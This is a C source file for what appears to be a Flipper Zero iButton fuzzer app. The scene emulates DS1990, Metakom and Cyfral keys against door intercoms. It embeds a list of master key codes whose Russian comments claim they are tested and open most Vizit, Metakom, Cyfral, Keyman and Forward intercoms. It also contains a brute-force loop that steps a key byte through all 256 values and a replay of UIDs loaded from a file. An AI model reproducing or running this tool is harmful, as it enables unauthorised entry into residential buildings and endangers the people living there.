#include "ibtnfuzzer_scene_run_attack.h"
#include <gui/elements.h>

uint8_t counter = 0;

uint8_t id_list_ds1990[25][8] = {
    {0x01, 0xBE, 0x40, 0x11, 0x5A, 0x36, 0x00, 0xE1}, //– код универсального ключа, для Vizit
    {0x01, 0xBE, 0x40, 0x11, 0x5A, 0x56, 0x00, 0xBB}, //- проверен работает
    {0x01, 0xBE, 0x40, 0x11, 0x00, 0x00, 0x00, 0x77}, //- проверен работает
    {0x01, 0xBE, 0x40, 0x11, 0x0A, 0x00, 0x00, 0x1D}, //- проверен работает Визит иногда КЕЙМАНЫ
    {0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x2F}, //- проверен(метаком, цифрал, ВИЗИТ).
    {0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x9B}, //- проверен Визит, Метакомы, КОНДОР
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x14}, //???-Открываает 98% Метаком и некоторые Цифрал
    {0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x19, 0xFF}, //???-Отлично работает на старых домофонах
    {0x01, 0x6F, 0x2E, 0x88, 0x8A, 0x00, 0x00, 0x4D}, //???-Открывать что-то должен
    {0x01, 0x53, 0xD4, 0xFE, 0x00, 0x00, 0x7E, 0x88}, //???-Cyfral, Metakom
    {0x01, 0x53, 0xD4, 0xFE, 0x00, 0x00, 0x00, 0x6F}, //???-домофоны Визит (Vizit) - до 99%
    {0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3D}, //???-домофоны Cyfral CCD-20 - до 70%
    {0x01, 0x00, 0xBE, 0x11, 0xAA, 0x00, 0x00, 0xFB}, //???-домофоны Кейман (KEYMAN)
    {0x01, 0x76, 0xB8, 0x2E, 0x0F, 0x00, 0x00, 0x5C}, //???-домофоны Форвард
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Null bytes
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Only FF
    {0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11}, // Only 11
    {0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22}, // Only 22
    {0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33}, // Only 33
    {0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44}, // Only 44
    {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55}, // Only 55
    {0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66}, // Only 66
    {0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77}, // Only 77
    {0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88}, // Only 88
    {0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99}, // Only 99
};

uint8_t id_list_metakom[17][4] = {
    {0x00, 0x00, 0x00, 0x00}, // Null bytes
    {0xFF, 0xFF, 0xFF, 0xFF}, // Only FF
    {0x11, 0x11, 0x11, 0x11}, // Only 11
    {0x22, 0x22, 0x22, 0x22}, // Only 22
    {0x33, 0x33, 0x33, 0x33}, // Only 33
    {0x44, 0x44, 0x44, 0x44}, // Only 44
    {0x55, 0x55, 0x55, 0x55}, // Only 55
    {0x66, 0x66, 0x66, 0x66}, // Only 66
    {0x77, 0x77, 0x77, 0x77}, // Only 77
    {0x88, 0x88, 0x88, 0x88}, // Only 88
    {0x99, 0x99, 0x99, 0x99}, // Only 99
    {0x12, 0x34, 0x56, 0x78}, // Incremental UID
    {0x9A, 0x78, 0x56, 0x34}, // Decremental UID
    {0x04, 0xd0, 0x9b, 0x0d}, // ??
    {0x34, 0x00, 0x29, 0x3d}, // ??
    {0x04, 0xdf, 0x00, 0x00}, // ??
    {0xCA, 0xCA, 0xCA, 0xCA}, // ??
};

uint8_t id_list_cyfral[14][2] = {
    {0x00, 0x00}, // Null bytes
    {0xFF, 0xFF}, // Only FF
    {0x11, 0x11}, // Only 11
    {0x22, 0x22}, // Only 22
    {0x33, 0x33}, // Only 33
    {0x44, 0x44}, // Only 44
    {0x55, 0x55}, // Only 55
    {0x66, 0x66}, // Only 66
    {0x77, 0x77}, // Only 77
    {0x88, 0x88}, // Only 88
    {0x99, 0x99}, // Only 99
    {0x12, 0x34}, // Incremental UID
    {0x56, 0x34}, // Decremental UID
    {0xCA, 0xCA}, // ??
};

void ibtnfuzzer_scene_run_attack_on_enter(iBtnFuzzerState* context) {
    context->time_between_cards = 8;
    context->attack_step = 0;
    context->attack_stop_called = false;
    context->protocols = ibutton_protocols_alloc();
    context->key = ibutton_key_alloc(ibutton_protocols_get_max_data_size(context->protocols));
    context->worker = ibutton_worker_alloc(context->protocols);
    if(context->proto == Metakom) {
        context->keytype = ibutton_protocols_get_id_by_name(context->protocols, "Metakom");
    } else if(context->proto == Cyfral) {
        context->keytype = ibutton_protocols_get_id_by_name(context->protocols, "Cyfral");
    } else {
        context->keytype = ibutton_protocols_get_id_by_name(context->protocols, "DS1990");
    }
    context->workr_rund = false;
}

void ibtnfuzzer_scene_run_attack_on_exit(iBtnFuzzerState* context) {
    if(context->workr_rund) {
        ibutton_worker_stop(context->worker);
        ibutton_worker_stop_thread(context->worker);
        context->workr_rund = false;
    }
    ibutton_key_free(context->key);
    ibutton_worker_free(context->worker);
    ibutton_protocols_free(context->protocols);
    notification_message(context->notify, &sequence_blink_stop);
}

void ibtnfuzzer_scene_run_attack_on_tick(iBtnFuzzerState* context) {
    if(context->is_attacking) {
        if(1 == counter) {
            ibutton_worker_start_thread(context->worker);
            ibutton_key_set_protocol_id(context->key, context->keytype);
            iButtonEditableData data;
            ibutton_protocols_get_editable_data(context->protocols, context->key, &data);
            data.size = sizeof(context->payload);
            for(size_t i = 0; i < data.size; i++) {
                data.ptr[i] = context->payload[i];
            }

            ibutton_worker_emulate_start(context->worker, context->key);
            context->workr_rund = true;
        } else if(0 == counter) {
            if(context->workr_rund) {
                ibutton_worker_stop(context->worker);
                ibutton_worker_stop_thread(context->worker);
                context->workr_rund = false;
                furi_delay_ms(500);
            }
            switch(context->attack) {
            case iBtnFuzzerAttackDefaultValues:
                if(context->proto == DS1990) {
                    context->payload[0] = id_list_ds1990[context->attack_step][0];
                    context->payload[1] = id_list_ds1990[context->attack_step][1];
                    context->payload[2] = id_list_ds1990[context->attack_step][2];
                    context->payload[3] = id_list_ds1990[context->attack_step][3];
                    context->payload[4] = id_list_ds1990[context->attack_step][4];
                    context->payload[5] = id_list_ds1990[context->attack_step][5];
                    context->payload[6] = id_list_ds1990[context->attack_step][6];
                    context->payload[7] = id_list_ds1990[context->attack_step][7];

                    if(context->attack_step == 24) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_single_vibro);
                    } else {
                        context->attack_step++;
                    }
                    break;
                } else if(context->proto == Metakom) {
                    context->payload[0] = id_list_metakom[context->attack_step][0];
                    context->payload[1] = id_list_metakom[context->attack_step][1];
                    context->payload[2] = id_list_metakom[context->attack_step][2];
                    context->payload[3] = id_list_metakom[context->attack_step][3];

                    if(context->attack_step == 16) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_single_vibro);
                    } else {
                        context->attack_step++;
                    }
                    break;
                } else {
                    context->payload[0] = id_list_cyfral[context->attack_step][0];
                    context->payload[1] = id_list_cyfral[context->attack_step][1];

                    if(context->attack_step == 13) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_single_vibro);
                    } else {
                        context->attack_step++;
                    }
                    break;
                }
            case iBtnFuzzerAttackLoadFile:
                if(context->proto == DS1990) {
                    context->payload[0] = context->data[0];
                    context->payload[1] = context->data[1];
                    context->payload[2] = context->data[2];
                    context->payload[3] = context->data[3];
                    context->payload[4] = context->data[4];
                    context->payload[5] = context->data[5];
                    context->payload[6] = context->data[6];
                    context->payload[7] = context->data[7];

                    context->payload[context->key_index] = context->attack_step;

                    if(context->attack_step == 255) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_single_vibro);
                        break;
                    } else {
                        context->attack_step++;
                    }
                    break;
                } else if(context->proto == Cyfral) {
                    context->payload[0] = context->data[0];
                    context->payload[1] = context->data[1];

                    context->payload[context->key_index] = context->attack_step;

                    if(context->attack_step == 255) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_single_vibro);
                        break;
                    } else {
                        context->attack_step++;
                    }
                    break;
                } else {
                    context->payload[0] = context->data[0];
                    context->payload[1] = context->data[1];
                    context->payload[2] = context->data[2];
                    context->payload[3] = context->data[3];

                    context->payload[context->key_index] = context->attack_step;

                    if(context->attack_step == 255) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_single_vibro);
                        break;
                    } else {
                        context->attack_step++;
                    }
                    break;
                }

            case iBtnFuzzerAttackLoadFileCustomUids:
                if(context->proto == DS1990) {
                    bool end_of_list = false;
                    while(true) {
                        furi_string_reset(context->data_str);
                        if(!stream_read_line(context->uids_stream, context->data_str)) {
                            context->attack_step = 0;
                            counter = 0;
                            context->is_attacking = false;
                            notification_message(context->notify, &sequence_blink_stop);
                            notification_message(context->notify, &sequence_single_vibro);
                            stream_rewind(context->uids_stream);
                            end_of_list = true;
                            break;
                        };
                        if(furi_string_get_char(context->data_str, 0) == '#') continue;
                        if(furi_string_size(context->data_str) != 17) break;
                        break;
                    }
                    if(end_of_list) break;
                    FURI_LOG_D(TAG, furi_string_get_cstr(context->data_str));
                    if(furi_string_size(context->data_str) != 17) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_error);
                        break;
                    };

                    // string is valid, parse it in context->payload
                    for(uint8_t i = 0; i < 8; i++) {
                        char temp_str[3];
                        temp_str[0] = furi_string_get_cstr(context->data_str)[i * 2];
                        temp_str[1] = furi_string_get_cstr(context->data_str)[i * 2 + 1];
                        temp_str[2] = '\0';
                        context->payload[i] = (uint8_t)strtol(temp_str, NULL, 16);
                    }
                    break;
                } else if(context->proto == Cyfral) {
                    bool end_of_list = false;
                    while(true) {
                        furi_string_reset(context->data_str);
                        if(!stream_read_line(context->uids_stream, context->data_str)) {
                            context->attack_step = 0;
                            counter = 0;
                            context->is_attacking = false;
                            notification_message(context->notify, &sequence_blink_stop);
                            notification_message(context->notify, &sequence_single_vibro);
                            stream_rewind(context->uids_stream);
                            end_of_list = true;
                            break;
                        };
                        if(furi_string_get_char(context->data_str, 0) == '#') continue;
                        if(furi_string_size(context->data_str) != 5) break;
                        break;
                    }
                    if(end_of_list) break;
                    FURI_LOG_D(TAG, furi_string_get_cstr(context->data_str));
                    if(furi_string_size(context->data_str) != 5) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_error);
                        break;
                    };

                    // string is valid, parse it in context->payload
                    for(uint8_t i = 0; i < 2; i++) {
                        char temp_str[3];
                        temp_str[0] = furi_string_get_cstr(context->data_str)[i * 2];
                        temp_str[1] = furi_string_get_cstr(context->data_str)[i * 2 + 1];
                        temp_str[2] = '\0';
                        context->payload[i] = (uint8_t)strtol(temp_str, NULL, 16);
                    }
                    break;
                } else {
                    bool end_of_list = false;
                    while(true) {
                        furi_string_reset(context->data_str);
                        if(!stream_read_line(context->uids_stream, context->data_str)) {
                            context->attack_step = 0;
                            counter = 0;
                            context->is_attacking = false;
                            notification_message(context->notify, &sequence_blink_stop);
                            notification_message(context->notify, &sequence_single_vibro);
                            stream_rewind(context->uids_stream);
                            end_of_list = true;
                            break;
                        };
                        if(furi_string_get_char(context->data_str, 0) == '#') continue;
                        if(furi_string_size(context->data_str) != 9) break;
                        break;
                    }
                    FURI_LOG_D(TAG, furi_string_get_cstr(context->data_str));
                    if(end_of_list) break;
                    if(furi_string_size(context->data_str) != 9) {
                        context->attack_step = 0;
                        counter = 0;
                        context->is_attacking = false;
                        notification_message(context->notify, &sequence_blink_stop);
                        notification_message(context->notify, &sequence_error);
                        break;
                    };

                    // string is valid, parse it in context->payload
                    for(uint8_t i = 0; i < 4; i++) {
                        char temp_str[3];
                        temp_str[0] = furi_string_get_cstr(context->data_str)[i * 2];
                        temp_str[1] = furi_string_get_cstr(context->data_str)[i * 2 + 1];
                        temp_str[2] = '\0';
                        context->payload[i] = (uint8_t)strtol(temp_str, NULL, 16);
                    }
                    break;
                }
            }
        }

        if(counter > context->time_between_cards) {
            counter = 0;
        } else {
            counter++;
        }
    }
}

void ibtnfuzzer_scene_run_attack_on_event(iBtnFuzzerEvent event, iBtnFuzzerState* context) {
    if(event.evt_type == EventTypeKey) {
        if(event.input_type == InputTypeShort) {
            switch(event.key) {
            case InputKeyDown:
                break;
            case InputKeyUp:
                break;
            case InputKeyLeft:
                if(!context->is_attacking) {
                    if(context->time_between_cards > 4) {
                        context->time_between_cards--;
                    }
                }
                break;
            case InputKeyRight:
                if(!context->is_attacking) {
                    if(context->time_between_cards < 80) {
                        context->time_between_cards++;
                    }
                }
                break;
            case InputKeyOk:
                counter = 0;
                if(!context->is_attacking) {
                    notification_message(context->notify, &sequence_blink_start_blue);
                    context->is_attacking = true;
                } else {
                    context->is_attacking = false;
                    notification_message(context->notify, &sequence_blink_stop);
                    notification_message(context->notify, &sequence_single_vibro);
                }
                break;
            case InputKeyBack:
                context->is_attacking = false;
                counter = 0;

                notification_message(context->notify, &sequence_blink_stop);
                if(context->attack_stop_called) {
                    context->attack_stop_called = false;
                    context->attack_step = 0;
                    if(context->attack == iBtnFuzzerAttackLoadFileCustomUids) {
                        furi_string_reset(context->data_str);
                        stream_rewind(context->uids_stream);
                        buffered_file_stream_close(context->uids_stream);
                    }

                    furi_string_reset(context->notification_msg);
                    context->current_scene = SceneEntryPoint;
                }

                context->attack_stop_called = true;
                break;
            default:
                break;
            }
        }
        if(event.input_type == InputTypeLong) {
            switch(event.key) {
            case InputKeyLeft:
                if(!context->is_attacking) {
                    if(context->time_between_cards > 4) {
                        if((context->time_between_cards - 10) > 4) {
                            context->time_between_cards -= 10;
                        }
                    }
                }
                break;
            case InputKeyRight:
                if(!context->is_attacking) {
                    if(context->time_between_cards < 80) {
                        context->time_between_cards += 10;
                    }
                }
                break;
            default:
                break;
            }
        }
    }
}

void ibtnfuzzer_scene_run_attack_on_draw(Canvas* canvas, iBtnFuzzerState* context) {
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);

    // Frame
    //canvas_draw_frame(canvas, 0, 0, 128, 64);

    // Title
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(
        canvas, 64, 2, AlignCenter, AlignTop, furi_string_get_cstr(context->attack_name));

    char uid[25];
    char speed[16];
    if(context->proto == Metakom) {
        snprintf(
            uid,
            sizeof(uid),
            "%02X:%02X:%02X:%02X",
            context->payload[0],
            context->payload[1],
            context->payload[2],
            context->payload[3]);
    } else if(context->proto == Cyfral) {
        snprintf(uid, sizeof(uid), "%02X:%02X", context->payload[0], context->payload[1]);
    } else {
        snprintf(
            uid,
            sizeof(uid),
            "%02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X",
            context->payload[0],
            context->payload[1],
            context->payload[2],
            context->payload[3],
            context->payload[4],
            context->payload[5],
            context->payload[6],
            context->payload[7]);
    }

    canvas_draw_str_aligned(canvas, 64, 38, AlignCenter, AlignTop, uid);

    canvas_set_font(canvas, FontSecondary);

    canvas_draw_str_aligned(
        canvas, 64, 26, AlignCenter, AlignTop, furi_string_get_cstr(context->proto_name));

    snprintf(speed, sizeof(speed), "Time delay: %d", context->time_between_cards);

    //canvas_draw_str_aligned(canvas, 0, 22, AlignLeft, AlignTop, "Speed:");
    canvas_draw_str_aligned(canvas, 64, 14, AlignCenter, AlignTop, speed);
    //char start_stop_msg[20];
    if(context->is_attacking) {
        elements_button_center(canvas, "Stop");
        //snprintf(start_stop_msg, sizeof(start_stop_msg), " Press OK to stop ");
    } else {
        elements_button_center(canvas, "Start");
        elements_button_left(canvas, "TD -");
        elements_button_right(canvas, "+ TD");
    }
    //canvas_draw_str_aligned(canvas, 64, 44, AlignCenter, AlignTop, start_stop_msg);
}
